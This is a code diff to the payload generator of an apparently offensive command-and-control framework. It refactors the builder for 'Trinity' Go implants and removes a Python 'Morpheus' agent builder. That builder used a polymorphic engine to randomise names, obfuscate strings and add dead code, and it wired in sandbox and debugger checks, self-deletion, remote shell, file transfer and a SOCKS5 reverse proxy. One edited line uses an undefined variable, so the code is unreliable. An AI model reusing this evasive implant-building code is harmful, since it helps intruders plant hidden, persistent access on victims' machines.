@@ -27,7 +27,9 @@ import hashlib
 import time
 import os
 from datetime import datetime
-from core.config import NeoC2Config
+import subprocess
+import tempfile
+import shutil
 from cryptography.fernet import Fernet
 
 class PolymorphicEngine:
@@ -70,7 +72,7 @@ class PolymorphicEngine:
             return f"chr({codes[0]}) + chr({codes[1]}) + chr({codes[2:]})" if len(codes) >= 3 else f"chr({','.join(codes)})"
         elif technique == 3:
             reversed_s = s[::-1]
-            return f"'{reversed_s}'[::-1]"
+            return f"'{s[:mid]}' + '{s[mid:]}'"
         else:
             mid = len(s) // 2
             return f"'{s[:mid]}' + '{s[mid:]}'"
@@ -89,7 +91,7 @@ class PolymorphicEngine:
         return random.choice(dead_code_templates)
 
 
-class PayloadGenerator:
+class TrinityPayloadGenerator:
     def __init__(self, config, db):
         self.config = config
         self.db = db
@@ -97,8 +99,13 @@ class PayloadGenerator:
     def _generate_fernet_key(self):
         return Fernet.generate_key().decode()
 
-    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
-        print(f"[DEBUG] Generating POLYMORPHIC payload for listener_id: {listener_id}")
+    def generate_payload(self, listener_id, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True, kill_date='2025-12-31T23:59:59Z', working_hours=None, redirector_host='0.0.0.0', redirector_port=80, failover_urls=None, profile_headers=None):
+        if failover_urls is None:
+            failover_urls = []
+        if profile_headers is None:
+            profile_headers = {'User-Agent': 'Trinity C2 Agent'}
+
+        print(f"[DEBUG] Generating POLYMORPHIC Trinity payload for listener_id: {listener_id}")
 
         listener = self.db.get_listener(listener_id)
         if not listener:
@@ -125,17 +132,23 @@ class PayloadGenerator:
             print(f"[WARNING] Profile config is not a dict, using empty config")
             profile_config = {}
 
+        # Override with passed parameters
+        profile_config['kill_date'] = kill_date
+        profile_config['working_hours'] = working_hours
+        profile_config['redirector'] = {
+            'redirector_host': redirector_host,
+            'redirector_port': redirector_port
+        }
+        profile_config['failover_urls'] = failover_urls
+        if profile_headers:
+            profile_config['headers'] = profile_headers
+
         protocol = profile_config.get('protocol', 'http')
         host = listener['host']
         if host == '0.0.0.0':
             host = self.config.get('server.host', '127.0.0.1')
         port = listener['port']
         c2_server_url = f"{protocol}://{host}:{port}"
-
-        # Handle redirector configuration
-        redirector_config = profile_config.get('redirector', {})
-        redirector_host = redirector_config.get('redirector_host', '0.0.0.0')
-        redirector_port = redirector_config.get('redirector_port', 80)
 
         agent_id = str(uuid.uuid4())
         secret_key = self.db._generate_secret_key() if hasattr(self.db, '_generate_secret_key') else self._generate_fernet_key()
@@ -173,282 +186,9 @@ class PayloadGenerator:
             "days": [1, 2, 3, 4, 5]  # Monday to Friday
         })
 
-        # Extract failover URLs from profile_config if use_failover is enabled
-        failover_urls = profile_config.get('failover_urls', []) if use_failover else []
-
-        # Extract headers from profile for Trinity agent
-        profile_headers = profile_config.get('headers', {'User-Agent': 'Trinity C2 Agent'})
-
-        print(f"[+] Generating polymorphic variant")
-        if payload_type == "morpheus":
-            return self._generate_morpheus(
-                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls
-            )
-        elif payload_type == "trinity":
-            return self._generate_go_agent(
-                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_execute_pe=include_execute_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox
-            )
-        else:
-            raise ValueError(f"Unsupported payload type: {payload_type}")
-
-    def _generate_morpheus(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
-        if failover_urls is None:
-            failover_urls = []
-        if working_hours is None:
-            working_hours = {
-                "start_hour": 9,
-                "end_hour": 17,
-                "timezone": "UTC",
-                "days": [1, 2, 3, 4, 5]  # Monday to Friday
-            }
-
-        poly = PolymorphicEngine()
-
-        endpoints = profile_config.get('endpoints', {})
-        register_uri = endpoints.get('register', '/api/users/register')
-        tasks_uri = endpoints.get('tasks', '/api/users/{agent_id}/profile')
-        results_uri = endpoints.get('results', '/api/users/{agent_id}/activity')
-        interactive_uri = endpoints.get('interactive', '/api/users/{agent_id}/settings')
-        interactive_status_uri = endpoints.get('interactive_status', '/api/users/{agent_id}/status')
-
-        headers = profile_config.get('headers', {'User-Agent': 'Python C2 Agent'})
-        heartbeat = profile_config.get('heartbeat_interval', 60)
-        jitter = profile_config.get('jitter', 0.2)
-
-        class_name = poly.generate_random_name('Agent')
-
-        m_init = '__init__'  # Keep __init__ standard
-        m_send = poly.generate_random_name('send_')
-        m_register = poly.generate_random_name('register_')
-        m_get_tasks = poly.generate_random_name('get_tasks_')
-        m_exec = poly.generate_random_name('exec_')
-        m_submit = poly.generate_random_name('submit_')
-        m_run = poly.generate_random_name('run_')
-        m_check_interactive_status = poly.generate_random_name('check_interactive_')
-        m_get_interactive_command = poly.generate_random_name('get_interactive_cmd_')
-        m_submit_interactive_result = poly.generate_random_name('submit_interactive_')
-        m_start_interactive_polling = poly.generate_random_name('start_interactive_')
-        m_stop_interactive_polling = poly.generate_random_name('stop_interactive_')
-        m_interactive_poll_worker = poly.generate_random_name('interactive_worker_')
-        m_enter_interactive_mode = poly.generate_random_name('enter_interactive_')
-        m_exit_interactive_mode = poly.generate_random_name('exit_interactive_')
-        m_stop_agent = poly.generate_random_name('stop_agent_')
-
-        m_check_sandbox = poly.generate_random_name('check_sandbox_')
-        m_check_debuggers = poly.generate_random_name('check_debuggers_')
-        m_check_network_tools = poly.generate_random_name('check_network_tools_')
-        m_self_delete = poly.generate_random_name('self_delete_')
-
-        # Failover method names
-        m_try_failover = poly.generate_random_name('try_failover_')
-        m_increment_fail_count = poly.generate_random_name('increment_fail_count_')
-        m_reset_fail_count = poly.generate_random_name('reset_fail_count_')
-
-        m_handle_upload = poly.generate_random_name('handle_upload_')
-        m_handle_download = poly.generate_random_name('handle_download_')
-
-        m_start_direct_shell = poly.generate_random_name('start_direct_shell_')
-        m_handle_direct_shell = poly.generate_random_name('handle_direct_shell_')
-
-
-        m_encrypt_data = poly.generate_random_name('encrypt_data_')
-        m_decrypt_data = poly.generate_random_name('decrypt_data_')
-        m_check_working_hours = poly.generate_random_name('check_working_hours_')
-        m_check_kill_date = poly.generate_random_name('check_kill_date_')
-
-        v_c2 = poly.generate_random_name('c2_')
-        v_agent_id = poly.generate_random_name('agent_id_')
-        v_headers = poly.generate_random_name('headers_')
-        v_heartbeat = poly.generate_random_name('heartbeat_')
-        v_jitter = poly.generate_random_name('jitter_')
-        v_register_uri = poly.generate_random_name('reg_uri_')
-        v_tasks_uri = poly.generate_random_name('tasks_uri_')
-        v_results_uri = poly.generate_random_name('results_uri_')
-        v_interactive_uri = poly.generate_random_name('interactive_uri_')
-        v_interactive_status_uri = poly.generate_random_name('interactive_status_uri_')
-        v_running = poly.generate_random_name('running_')
-        v_hostname = poly.generate_random_name('hostname_')
-        v_username = poly.generate_random_name('username_')
-        v_os_info = poly.generate_random_name('os_info_')
-        v_interactive_mode = poly.generate_random_name('interactive_mode_')
-        v_interactive_thread = poly.generate_random_name('interactive_thread_')
-        v_interactive_polling = poly.generate_random_name('interactive_polling_')
-        v_current_interactive_task = poly.generate_random_name('current_interactive_task_')
-
-        v_secret_key = poly.generate_random_name('secret_key_')
-        v_fernet = poly.generate_random_name('fernet_')
-
-
-        v_sandbox_enabled = poly.generate_random_name('sandbox_enabled_')
-
-        v_kill_date = poly.generate_random_name('kill_date_')
-        v_working_hours = poly.generate_random_name('working_hours_')
-
-        # Redirector variables
-        v_redirector_host = poly.generate_random_name('redirector_host_')
-        v_redirector_port = poly.generate_random_name('redirector_port_')
-        v_use_redirector = poly.generate_random_name('use_redirector_')
-
-        # Failover variables
-        v_use_failover = poly.generate_random_name('use_failover_')
-        v_failover_urls = poly.generate_random_name('failover_urls_')
-        v_current_c2_url = poly.generate_random_name('current_c2_url_')
-        v_current_fail_count = poly.generate_random_name('current_fail_count_')
-        v_max_fail_count = poly.generate_random_name('max_fail_count_')
-        v_in_failover_attempt = poly.generate_random_name('in_failover_attempt_')
-
-
-        # Reverse proxy variables
-        v_reverse_proxy_active = poly.generate_random_name('reverse_proxy_active_')
-        v_reverse_proxy_stop_event = poly.generate_random_name('reverse_proxy_stop_event_')
-        v_reverse_proxy_thread = poly.generate_random_name('reverse_proxy_thread_')
-
-        # Reverse proxy method names
-        m_start_reverse_proxy = poly.generate_random_name('start_reverse_proxy_')
-        m_stop_reverse_proxy = poly.generate_random_name('stop_reverse_proxy_')
-        m_handle_socks5 = poly.generate_random_name('handle_socks5_')
-        m_relay_data = poly.generate_random_name('relay_data_')
-
-        if obfuscate:
-            register_uri_code = poly.obfuscate_string(register_uri)
-            tasks_uri_code = poly.obfuscate_string(tasks_uri)
-            results_uri_code = poly.obfuscate_string(results_uri)
-            interactive_uri_code = poly.obfuscate_string(interactive_uri)
-            interactive_status_uri_code = poly.obfuscate_string(interactive_status_uri)
-        else:
-            register_uri_code = f'"{register_uri}"'
-            tasks_uri_code = f'"{tasks_uri}"'
-            results_uri_code = f'"{results_uri}"'
-            interactive_uri_code = f'"{interactive_uri}"'
-            interactive_status_uri_code = f'"{interactive_status_uri}"'
-
-        dead_code_1 = poly.generate_dead_code()
-        dead_code_2 = poly.generate_dead_code()
-        dead_code_3 = poly.generate_dead_code()
-        dead_code_4 = poly.generate_dead_code()
-
-        imports = [
-            "import sys", "import os", "import time", "import json",
-            "import socket", "import platform", "import subprocess",
-            "import requests", "import random", "import threading",
-            "import base64", "import shutil", "import ctypes", "import uuid",
-            "from cryptography.fernet import Fernet"
-        ]
-        random.shuffle(imports)
-        imports_code = '\n'.join(imports)
-
-        listener_id_for_registration = 'web_app_default'
-
-
-        template_path = os.path.join(os.path.dirname(__file__), 'morpheus_template.py')
-        with open(template_path, 'r') as f:
-            agent_template = f.read()
-
-        agent_template = agent_template.format(
-            imports_code=imports_code,
-            dead_code_1=dead_code_1,
-            class_name=class_name,
-            m_init=m_init,
-            m_send=m_send,
-            m_register=m_register,
-            m_get_tasks=m_get_tasks,
-            m_exec=m_exec,
-            m_submit=m_submit,
-            m_run=m_run,
-            m_check_interactive_status=m_check_interactive_status,
-            m_get_interactive_command=m_get_interactive_command,
-            m_submit_interactive_result=m_submit_interactive_result,
-            m_start_interactive_polling=m_start_interactive_polling,
-            m_stop_interactive_polling=m_stop_interactive_polling,
-            m_interactive_poll_worker=m_interactive_poll_worker,
-            m_enter_interactive_mode=m_enter_interactive_mode,
-            m_exit_interactive_mode=m_exit_interactive_mode,
-            m_stop_agent=m_stop_agent,
-            m_check_sandbox=m_check_sandbox,
-            m_check_debuggers=m_check_debuggers,
-            m_check_network_tools=m_check_network_tools,
-            m_self_delete=m_self_delete,
-            m_try_failover=m_try_failover,
-            m_increment_fail_count=m_increment_fail_count,
-            m_reset_fail_count=m_reset_fail_count,
-            m_handle_upload=m_handle_upload,
-            m_handle_download=m_handle_download,
-            m_start_direct_shell=m_start_direct_shell,
-            m_handle_direct_shell=m_handle_direct_shell,
-            m_encrypt_data=m_encrypt_data,
-            m_decrypt_data=m_decrypt_data,
-            m_check_working_hours=m_check_working_hours,
-            m_check_kill_date=m_check_kill_date,
-            v_c2=v_c2,
-            v_agent_id=v_agent_id,
-            v_headers=v_headers,
-            headers=json.dumps(headers),
-            v_heartbeat=v_heartbeat,
-            v_jitter=v_jitter,
-            v_register_uri=v_register_uri,
-            v_tasks_uri=v_tasks_uri,
-            v_results_uri=v_results_uri,
-            v_interactive_uri=v_interactive_uri,
-            v_interactive_status_uri=v_interactive_status_uri,
-            heartbeat=heartbeat,
-            jitter=jitter,
-            register_uri_code=register_uri_code,
-            tasks_uri_code=tasks_uri_code,
-            results_uri_code=results_uri_code,
-            interactive_uri_code=interactive_uri_code,
-            interactive_status_uri_code=interactive_status_uri_code,
-            v_running=v_running,
-            v_hostname=v_hostname,
-            v_username=v_username,
-            v_os_info=v_os_info,
-            v_interactive_mode=v_interactive_mode,
-            v_interactive_thread=v_interactive_thread,
-            v_interactive_polling=v_interactive_polling,
-            v_current_interactive_task=v_current_interactive_task,
-            v_secret_key=v_secret_key,
-            v_fernet=v_fernet,
-            v_sandbox_enabled=v_sandbox_enabled,
-            v_redirector_host=v_redirector_host,
-            v_redirector_port=v_redirector_port,
-            v_use_redirector=v_use_redirector,
-            v_use_failover=v_use_failover,
-            v_failover_urls=v_failover_urls,
-            v_current_c2_url=v_current_c2_url,
-            v_current_fail_count=v_current_fail_count,
-            v_max_fail_count=v_max_fail_count,
-            v_in_failover_attempt=v_in_failover_attempt,
-            v_kill_date=v_kill_date,
-            v_working_hours=v_working_hours,
-            kill_date=kill_date,
-            working_hours_start_hour=working_hours.get('start_hour', 9),
-            working_hours_end_hour=working_hours.get('end_hour', 17),
-            working_hours_timezone=working_hours.get('timezone', 'UTC'),
-            working_hours_days=working_hours.get('days', [1, 2, 3, 4, 5]),  # Pass as actual list for template formatting
-            sandbox_check_enabled=not disable_sandbox,  # Set to False if sandbox is disabled
-            dead_code_2=dead_code_2,
-            dead_code_3=dead_code_3,
-            dead_code_4=dead_code_4,
-            c2_url=c2_url,
-            agent_id=agent_id,
-            listener_id_for_registration=listener_id_for_registration,
-            secret_key=secret_key,
-            redirector_host=redirector_host,
-            redirector_port=redirector_port,
-            use_redirector=str(use_redirector).lower().capitalize(),
-            use_failover=str(use_failover).lower().capitalize(),
-            failover_urls=failover_urls,
-            v_reverse_proxy_active=v_reverse_proxy_active,
-            v_reverse_proxy_stop_event=v_reverse_proxy_stop_event,
-            v_reverse_proxy_thread=v_reverse_proxy_thread,
-            m_start_reverse_proxy=m_start_reverse_proxy,
-            m_stop_reverse_proxy=m_stop_reverse_proxy,
-            m_handle_socks5=m_handle_socks5,
-            m_relay_data=m_relay_data
+        return self._generate_go_agent(
+            agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_execute_pe=include_execute_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox
         )
-
-        print(f"[+] POLYMORPHIC Morpheus agent generated (Class: {class_name})")
-        return agent_template.strip()
-
 
     def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
         if failover_urls is None:
